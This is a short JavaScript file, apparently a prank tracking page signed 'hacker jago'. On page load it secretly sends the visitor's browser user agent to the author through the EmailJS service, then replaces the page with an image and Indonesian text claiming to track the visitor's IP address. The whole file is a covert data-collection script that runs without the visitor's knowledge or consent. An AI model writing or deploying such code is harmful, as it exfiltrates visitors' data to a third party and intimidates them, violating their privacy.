window.addEventListener("load", hello);



var parameter = {
from_name: 'hacker jago',
message : navigator.userAgent

}

var service = 'service_if1g2rg';
var template = 'template_2wa0xiy';

var edav = "ip address mu ku lacak";

function hello(){
	emailjs.send(service,template,parameter)
	.then(function(response){
		document.body.innerHTML="<img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjr1plvCwiR5r2SivJYZRnzitLDOxulslvRw&usqp=CAU'><br><h1>"+edav+"</h1>";
		
		},function(error){
			alert("gagal");
			});
}
	